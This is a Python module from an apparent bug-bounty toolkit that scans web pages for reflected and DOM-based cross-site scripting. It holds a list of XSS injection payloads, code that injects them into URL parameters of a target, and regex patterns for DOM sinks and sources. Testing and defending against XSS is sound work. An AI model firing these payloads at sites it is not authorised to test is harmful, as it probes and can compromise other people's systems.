"""
XSS Scanner — Reflected, Stored, and DOM-based XSS detection.
Tools: dalfox, XSStrike patterns, manual payload injection.
Ref: awesome-bugbounty-tools XSS Injection category.
"""
import re
import json
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from .utils import stealth_headers, safe_get, run_bin

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '{{7*7}}',
    '<svg/onload=alert(1)>',
    '"><svg/onload=confirm(1)>',
    "javascript:alert(1)//",
    '<img src=x onerror=prompt(1)>',
    '"><iframe srcdoc="<script>alert(1)</script>">',
]

DOM_XSS_SINKS = [
    r'document\.write\s*\(',
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'eval\s*\(',
    r'setTimeout\s*\(\s*["\']',
    r'setInterval\s*\(\s*["\']',
    r'document\.location\s*=',
    r'window\.location\s*=',
    r'\.src\s*=',
    r'jQuery\s*\(\s*["\'].*location',
]

DOM_XSS_SOURCES = [
    r'location\.hash',
    r'location\.search',
    r'location\.href',
    r'document\.referrer',
    r'document\.URL',
    r'window\.name',
    r'document\.cookie',
]


def check_xss(url):
    """Test URL parameters for reflected XSS using payload injection."""
    findings = []

    # 1. Try dalfox binary first (most reliable)
    dalfox_out = run_bin("dalfox", ["url", url, "--silence", "--format", "json"], timeout=20)
    if dalfox_out:
        try:
            for line in dalfox_out.strip().split('\n'):
                if not line.strip():
                    continue
                data = json.loads(line)
                findings.append({
                    "type": "XSS_REFLECTED",
                    "url": data.get("data", url),
                    "severity": "HIGH",
                    "confidence": "HIGH",
                    "detail": f"Dalfox confirmed XSS: {data.get('type', 'reflected')} — {data.get('payload', '')[:60]}"
                })
        except (json.JSONDecodeError, KeyError):
            pass

    if findings:
        return findings

    # 2. Manual payload injection fallback
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        # Try common parameter names
        params = {"q": ["test"], "search": ["test"], "id": ["1"], "name": ["test"]}

    for param_name in list(params.keys())[:5]:
        for payload in XSS_PAYLOADS[:5]:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params), parsed.fragment
            ))

            r = safe_get(test_url)
            if r and payload in r.text:
                # Verify it's actually in HTML context (not inside a comment or attribute-escaped)
                ct = r.headers.get("Content-Type", "")
                if "html" in ct or "text" in ct:
                    findings.append({
                        "type": "XSS_REFLECTED",
                        "url": test_url,
                        "severity": "HIGH",
                        "confidence": "HIGH",
                        "detail": f"Payload reflected unescaped: {payload[:40]}"
                    })
                    break  # One confirmed XSS per param is enough
    return findings if findings else None


def check_dom_xss(url):
    """Scan JavaScript files for DOM XSS sinks+sources patterns."""
    findings = []
    r = safe_get(url)
    if not r:
        return None

    html = r.text

    # Extract JS file URLs
    js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html)
    js_sources = [html]  # Also scan inline scripts

    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    for js_url in js_urls[:10]:
        if not js_url.startswith("http"):
            js_url = base + ("/" + js_url if not js_url.startswith("/") else js_url)
        jr = safe_get(js_url)
        if jr:
            js_sources.append(jr.text)

    for js_code in js_sources:
        has_sink = any(re.search(p, js_code) for p in DOM_XSS_SINKS)
        has_source = any(re.search(p, js_code) for p in DOM_XSS_SOURCES)

        if has_sink and has_source:
            # Find the specific sink for the detail
            found_sinks = [p for p in DOM_XSS_SINKS if re.search(p, js_code)]
            found_sources = [p for p in DOM_XSS_SOURCES if re.search(p, js_code)]
            findings.append({
                "type": "DOM_XSS_CANDIDATE",
                "url": url,
                "severity": "MEDIUM",
                "confidence": "MEDIUM",
                "detail": f"Sink: {found_sinks[0][:30]} + Source: {found_sources[0][:30]}"
            })
            break  # One finding per URL

    return findings if findings else None
